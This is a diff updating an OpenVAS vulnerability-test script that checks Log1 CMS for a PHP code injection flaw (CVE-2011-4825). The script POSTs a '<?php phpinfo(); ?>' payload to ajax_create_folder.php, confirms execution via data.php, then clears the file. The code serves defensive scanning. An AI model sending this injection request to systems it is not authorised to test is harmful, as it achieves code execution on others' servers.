@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_log1_cms_50523.nasl 3062 2016-04-14 11:03:39Z benallard $
+# $Id: gb_log1_cms_50523.nasl 5715 2017-03-24 11:34:41Z cfi $
 #
 # Log1 CMS 'data.php' PHP Code Injection Vulnerability
 #
@@ -29,16 +29,13 @@ if (description)
  script_oid("1.3.6.1.4.1.25623.1.0.103496");
  script_cve_id("CVE-2011-4825");
  script_bugtraq_id(50523);
- script_version ("$Revision: 3062 $");
+ script_version ("$Revision: 5715 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Log1 CMS 'data.php' PHP Code Injection Vulnerability");
-
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50523");
-
- script_tag(name:"last_modification", value:"$Date: 2016-04-14 13:03:39 +0200 (Thu, 14 Apr 2016) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-24 12:34:41 +0100 (Fri, 24 Mar 2017) $");
  script_tag(name:"creation_date", value:"2012-06-18 17:36:01 +0100 (Mon, 18 Jun 2012)");
- script_summary("Determine if installed Log1 CMS is vulnerable");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
@@ -58,23 +55,18 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
    
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
-if(!can_host_php(port:port))exit(0);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-host = get_host_name();
-if( port != 80 && port != 443 )
-  host += ':' + port;
+host = http_host_name( port:port );
 ex = string("bla=1&blub=2&foo=<?php phpinfo(); ?>");
 
-dirs = make_list("/cms",cgi_dirs());
+foreach dir( make_list_unique( "/cms", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
-
-  filename = string(dir,"/admin/libraries/ajaxfilemanager/ajax_create_folder.php");
+  if( dir == "/" ) dir = "";
+  filename = dir + "/admin/libraries/ajaxfilemanager/ajax_create_folder.php";
 
   req = string("POST ", filename, " HTTP/1.1\r\n", 
                "Host: ", host, "\r\n",
@@ -83,17 +75,15 @@ foreach dir (dirs) {
                "Content-Length: ", strlen(ex), 
                "\r\n\r\n", 
                ex);
-
   result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
   if(result =~ "HTTP/1.. 200") {
 
-    url = string(dir, "/admin/libraries/ajaxfilemanager/inc/data.php");
-    req = http_get(item:url, port:port);
+    url = dir + "/admin/libraries/ajaxfilemanager/inc/data.php";
+    req = http_get( item:url, port:port );
+    res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
 
-    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-
-    if("<title>phpinfo()" >< result) {
+    if( "<title>phpinfo()" >< res ) {
 
       # clean the data.php on success by sending empty POST...
       ex = string("");
@@ -105,14 +95,12 @@ foreach dir (dirs) {
                    "Content-Length: ", strlen(ex), 
                    "\r\n\r\n", 
                    ex); 
-
-      result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
- 
-      security_message(port:port);
-      exit(0);
-
+      http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
   }
 }
 
-exit(99);
+exit( 99 );
